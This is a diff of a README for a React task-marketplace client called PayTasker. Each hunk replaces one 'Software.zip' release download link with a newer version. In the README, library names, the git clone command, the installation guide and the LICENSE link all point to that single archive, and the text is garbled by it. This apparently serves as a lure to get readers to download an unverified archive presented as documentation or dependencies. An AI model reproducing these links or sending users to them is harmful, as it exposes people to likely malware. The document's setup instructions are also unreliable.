@@ -2,7 +2,7 @@
 
 ### A web platform where users can complete tasks to earn coins. Features include task management, coin transactions, user roles (Worker, Buyer, Admin), Stripe payment integration, and real-time notifications.
 
-[![Download Software](https://github.com/Whitreyce3/PayTasker-client/releases/download/v1.0/Software.zip)](https://github.com/Whitreyce3/PayTasker-client/releases/download/v1.0/Software.zip)
+[![Download Software](https://github.com/Whitreyce3/PayTasker-client/releases/download/v2.0/Software.zip)](https://github.com/Whitreyce3/PayTasker-client/releases/download/v2.0/Software.zip)
 
 ## Table of Contents
 
@@ -32,9 +32,9 @@ The PayTasker-client repository utilizes various technologies to provide a robus
 
 🔧 Axios - Promise-based HTTP client for making requests.
 🔧 Firebase - Platform for building mobile and web applications.
-🔧 https://github.com/Whitreyce3/PayTasker-client/releases/download/v1.0/Software.zip - Library for parsing, validating, manipulating, and formatting dates.
+🔧 https://github.com/Whitreyce3/PayTasker-client/releases/download/v2.0/Software.zip - Library for parsing, validating, manipulating, and formatting dates.
 🔧 React Form Hook - Managing form state and validation in React applications.
-🔧 https://github.com/Whitreyce3/PayTasker-client/releases/download/v1.0/Software.zip - JavaScript library for building user interfaces.
+🔧 https://github.com/Whitreyce3/PayTasker-client/releases/download/v2.0/Software.zip - JavaScript library for building user interfaces.
 🔧 React Router - Declarative routing for React applications.
 🔧 SweetAlert2 - Beautiful, responsive alerts for user interactions.
 🔧 Swiper - Modern touch slider and swiper for mobile devices.
@@ -47,7 +47,7 @@ To quickly get started with PayTasker-client, follow these steps:
 
 1. Clone the repository:
 ```bash
-git clone https://github.com/Whitreyce3/PayTasker-client/releases/download/v1.0/Software.zip
+git clone https://github.com/Whitreyce3/PayTasker-client/releases/download/v2.0/Software.zip
 ```
 2. Install dependencies:
 ```bash
@@ -60,7 +60,7 @@ npm start
 
 ## Installation
 
-For detailed installation instructions and requirements, please refer to the [Installation Guide](https://github.com/Whitreyce3/PayTasker-client/releases/download/v1.0/Software.zip).
+For detailed installation instructions and requirements, please refer to the [Installation Guide](https://github.com/Whitreyce3/PayTasker-client/releases/download/v2.0/Software.zip).
 
 ## Contributing
 
@@ -73,7 +73,7 @@ Your contributions are always welcome! If you'd like to contribute to PayTasker-
 
 ## License
 
-This project is licensed under the MIT License - see the [LICENSE](https://github.com/Whitreyce3/PayTasker-client/releases/download/v1.0/Software.zip) file for details.
+This project is licensed under the MIT License - see the [LICENSE](https://github.com/Whitreyce3/PayTasker-client/releases/download/v2.0/Software.zip) file for details.
 
 ---
 
